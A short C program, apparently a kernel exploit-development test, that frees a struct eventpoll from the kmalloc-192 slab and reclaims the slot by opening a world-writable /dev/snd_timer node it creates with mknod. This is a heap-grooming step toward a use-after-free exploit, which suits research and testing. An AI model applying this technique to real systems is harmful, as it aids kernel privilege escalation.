#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>

int main() {
    printf("[*] Starting bounded inner_epoll free & snd_timer_user allocation test...\n");
    
    // 1. Create inner_epoll (allocates struct eventpoll in kmalloc-192)
    int epfd = epoll_create1(0);
    if (epfd < 0) {
        perror("[-] epoll_create1 failed");
        return 1;
    }
    printf("[*] Created inner_epoll (epfd=%d)\n", epfd);

    // 2. Close inner_epoll (frees struct eventpoll back to kmalloc-192)
    close(epfd);
    printf("[*] Closed inner_epoll (freed struct eventpoll)\n");

    // 3. Ensure /dev/snd_timer device node exists
    mknod("/dev/snd_timer", S_IFCHR | 0666, makedev(116, 33));

    // 4. Open /dev/snd_timer (allocates struct snd_timer_user in kmalloc-192)
    printf("[*] Opening /dev/snd_timer...\n");
    int timer_fd = open("/dev/snd_timer", O_RDONLY);
    if (timer_fd < 0) {
        perror("[-] open /dev/snd_timer failed");
        return 1;
    }
    printf("[+] Opened /dev/snd_timer (fd=%d, allocated snd_timer_user)\n", timer_fd);

    close(timer_fd);
    printf("[*] Finished cycle.\n");
    return 0;
}
